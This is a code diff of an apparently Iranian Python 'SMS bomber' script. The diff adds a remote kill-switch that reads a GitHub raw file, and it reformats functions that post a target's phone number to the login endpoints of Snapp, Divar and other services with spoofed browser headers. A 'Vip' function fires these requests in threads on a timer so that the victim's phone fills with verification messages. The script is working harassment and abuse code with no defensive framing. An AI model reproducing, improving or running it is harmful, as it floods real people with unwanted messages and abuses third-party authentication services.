@@ -1,11 +1,12 @@
 from requests import get as gt
 
-url = ""
+url = "https://raw.githubusercontent.com/hesarbinam/sms-bomber/main/active.txt"
+
 req = gt(url)
 
-print(str(req.text))
+ac = req.text
 
-if (False):
+if int(ac) == 1:
 
     from platform import node, system, release
 
@@ -27,12 +28,14 @@ if (False):
 
 
     def snap(phone):
-        snapH = {"Host": "app.snapp.taxi", "content-length": "29", "x-app-name": "passenger-pwa", "x-app-version": "5.0.0",
+        snapH = {"Host": "app.snapp.taxi", "content-length": "29", "x-app-name": "passenger-pwa",
+                 "x-app-version": "5.0.0",
                  "app-version": "pwa",
                  "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36",
                  "content-type": "application/json", "accept": "*/*", "origin": "https://app.snapp.taxi",
                  "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty",
-                 "referer": "https://app.snapp.taxi/login/?redirect_to\u003d%2F", "accept-encoding": "gzip, deflate, br",
+                 "referer": "https://app.snapp.taxi/login/?redirect_to\u003d%2F",
+                 "accept-encoding": "gzip, deflate, br",
                  "accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6",
                  "cookie": "_gat\u003d1"}
         snapD = {"cellphone": phone}
@@ -92,7 +95,8 @@ if (False):
                   'x-standard-divar-error': 'true'}
         divarD = {"phone": phone.split("+98")[1]}
         try:
-            divarR = post(timeout=5, url="https://api.divar.ir/v5/auth/authenticate", headers=divarH, json=divarD).json()
+            divarR = post(timeout=5, url="https://api.divar.ir/v5/auth/authenticate", headers=divarH,
+                          json=divarD).json()
             if divarR["authenticate_response"] == "AUTHENTICATION_VERIFICATION_CODE_SENT":
                 print(f'{g}(Divar) {w}Code Was Sent')
                 return True
@@ -953,9 +957,7 @@ if (False):
     g = '\033[32;1m'
     y = '\033[1;33m'
     w = '\033[1;37m'
-    printLow(
-        f'{y}Info:\n    {g}[+] {y}Site: {w}MahdiHC-Team.ir\n    {g}[+] {y}TelegramChannel: {w}@Mahdiihack\n   \n{y}system:\n    {g}[+] {y}Platform: {w}{System}\n    {g}[+] {y}Node: {w}{Node}\n    {g}[+] {y}Release: {w}{Release}\n\n')
-
+  
 
     def Vip(phone, Time):
         Thread(target=snap, args=[phone]).start(), sleep(Time)
